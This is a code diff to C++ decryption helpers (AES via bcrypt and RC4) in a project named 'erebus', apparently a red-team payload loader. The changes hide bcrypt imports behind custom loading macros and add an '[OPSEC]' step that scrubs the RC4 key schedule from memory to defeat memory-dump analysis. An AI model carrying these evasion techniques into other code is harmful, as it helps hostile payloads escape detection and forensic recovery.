@@ -38,25 +38,19 @@ namespace erebus {
 			return false;
 		}
 
-		HMODULE bcrypt = LoadLibraryA("bcrypt.dll");
+		HMODULE bcrypt = erebus::LoadLibraryC(L"bcrypt.dll");
 		if (!bcrypt)
 		{
 			LOG_ERROR("AES decrypt: failed to load bcrypt.dll");
 			return false;
 		}
 
-		auto pBCryptOpenAlgorithmProvider =
-			(typeBCryptOpenAlgorithmProvider)GetProcAddress(bcrypt, "BCryptOpenAlgorithmProvider");
-		auto pBCryptSetProperty =
-			(typeBCryptSetProperty)GetProcAddress(bcrypt, "BCryptSetProperty");
-		auto pBCryptDecrypt =
-			(typeBCryptDecrypt)GetProcAddress(bcrypt, "BCryptDecrypt");
-		auto pBCryptGenerateSymmetricKey =
-			(typeBCryptGenerateSymmetricKey)GetProcAddress(bcrypt, "BCryptGenerateSymmetricKey");
-		auto pBCryptCloseAlgorithmProvider =
-			(typeBCryptCloseAlgorithmProvider)GetProcAddress(bcrypt, "BCryptCloseAlgorithmProvider");
-		auto pBCryptDestroyKey =
-			(typeBCryptDestroyKey)GetProcAddress(bcrypt, "BCryptDestroyKey");
+		ImportFunction(bcrypt, BCryptOpenAlgorithmProvider, typeBCryptOpenAlgorithmProvider);
+		ImportFunction(bcrypt, BCryptSetProperty, typeBCryptSetProperty);
+		ImportFunction(bcrypt, BCryptDecrypt, typeBCryptDecrypt);
+		ImportFunction(bcrypt, BCryptGenerateSymmetricKey, typeBCryptGenerateSymmetricKey);
+		ImportFunction(bcrypt, BCryptCloseAlgorithmProvider, typeBCryptCloseAlgorithmProvider);
+		ImportFunction(bcrypt, BCryptDestroyKey, typeBCryptDestroyKey);
 
 		typedef NTSTATUS(WINAPI* typeBCryptGetProperty)(
 			_In_ PVOID hObject,
@@ -66,12 +60,11 @@ namespace erebus {
 			_Out_ ULONG* pcbResult,
 			_In_ ULONG dwFlags);
 
-		auto pBCryptGetProperty =
-			(typeBCryptGetProperty)GetProcAddress(bcrypt, "BCryptGetProperty");
+		ImportFunction(bcrypt, BCryptGetProperty, typeBCryptGetProperty);
 
-		if (!pBCryptOpenAlgorithmProvider || !pBCryptSetProperty || !pBCryptDecrypt ||
-			!pBCryptGenerateSymmetricKey || !pBCryptCloseAlgorithmProvider ||
-			!pBCryptDestroyKey || !pBCryptGetProperty)
+		if (!BCryptOpenAlgorithmProvider || !BCryptSetProperty || !BCryptDecrypt ||
+			!BCryptGenerateSymmetricKey || !BCryptCloseAlgorithmProvider ||
+			!BCryptDestroyKey || !BCryptGetProperty)
 		{
 			LOG_ERROR("AES decrypt: missing BCrypt function(s)");
 			FreeLibrary(bcrypt);
@@ -92,14 +85,14 @@ namespace erebus {
 
 		do
 		{
-			if (!NT_SUCCESS(pBCryptOpenAlgorithmProvider(&hAlg, kAesAlg, nullptr, 0)))
+			if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, kAesAlg, nullptr, 0)))
 			{
 				LOG_ERROR("AES decrypt: BCryptOpenAlgorithmProvider failed");
 				break;
 			}
 
 			ULONG chainingModeLen = (ULONG)((wcslen(chainingMode) + 1) * sizeof(WCHAR));
-			if (!NT_SUCCESS(pBCryptSetProperty(hAlg, kChainingModeProp,
+			if (!NT_SUCCESS(BCryptSetProperty(hAlg, kChainingModeProp,
 				(PUCHAR)chainingMode, chainingModeLen, 0)))
 			{
 				LOG_ERROR("AES decrypt: BCryptSetProperty failed");
@@ -107,7 +100,7 @@ namespace erebus {
 			}
 
 			static const WCHAR kObjectLengthProp[] = L"ObjectLength";
-			if (!NT_SUCCESS(pBCryptGetProperty(hAlg, kObjectLengthProp,
+			if (!NT_SUCCESS(BCryptGetProperty(hAlg, kObjectLengthProp,
 				(PUCHAR)&keyObjectLen, sizeof(ULONG), &cbResult, 0)))
 			{
 				LOG_ERROR("AES decrypt: BCryptGetProperty(ObjectLength) failed");
@@ -121,7 +114,7 @@ namespace erebus {
 				break;
 			}
 
-			if (!NT_SUCCESS(pBCryptGenerateSymmetricKey(hAlg, &hKey, keyObject,
+			if (!NT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject,
 				keyObjectLen, key, (ULONG)keyLen, 0)))
 			{
 				LOG_ERROR("AES decrypt: BCryptGenerateSymmetricKey failed");
@@ -139,7 +132,7 @@ namespace erebus {
 				memcpy(ivCopy, iv, ivLen);
 			}
 
-			if (!NT_SUCCESS(pBCryptDecrypt(hKey, input, (ULONG)inputLen, nullptr,
+			if (!NT_SUCCESS(BCryptDecrypt(hKey, input, (ULONG)inputLen, nullptr,
 				ivCopy, (ULONG)ivLen, input, (ULONG)inputLen, &outLen, 0)))
 			{
 				LOG_ERROR("AES decrypt: BCryptDecrypt failed");
@@ -162,7 +155,7 @@ namespace erebus {
 		}
 		if (hKey)
 		{
-			pBCryptDestroyKey(hKey);
+			BCryptDestroyKey(hKey);
 		}
 		if (keyObject)
 		{
@@ -171,7 +164,7 @@ namespace erebus {
 		}
 		if (hAlg)
 		{
-			pBCryptCloseAlgorithmProvider(hAlg, 0);
+			BCryptCloseAlgorithmProvider(hAlg, 0);
 		}
 		FreeLibrary(bcrypt);
 		return success;
@@ -188,11 +181,11 @@ namespace erebus {
 	{
 		BYTE S[256];
 		BYTE temp;
-		
+
 		// KSA (Key Scheduling Algorithm)
 		for (int i = 0; i < 256; i++)
 			S[i] = i;
-		
+
 		int j = 0;
 		for (int i = 0; i < 256; i++)
 		{
@@ -201,7 +194,7 @@ namespace erebus {
 			S[i] = S[j];
 			S[j] = temp;
 		}
-		
+
 		// PRGA (Pseudo-Random Generation Algorithm)
 		int i = 0;
 		j = 0;
@@ -214,6 +207,9 @@ namespace erebus {
 			S[j] = temp;
 			Input[k] ^= S[(S[i] + S[j]) % 256];
 		}
+
+		// [OPSEC] Scrub S-box — prevents RC4 key schedule recovery from memory dump
+		SecureZeroMemory(S, sizeof(S));
 		return;
 	}
 
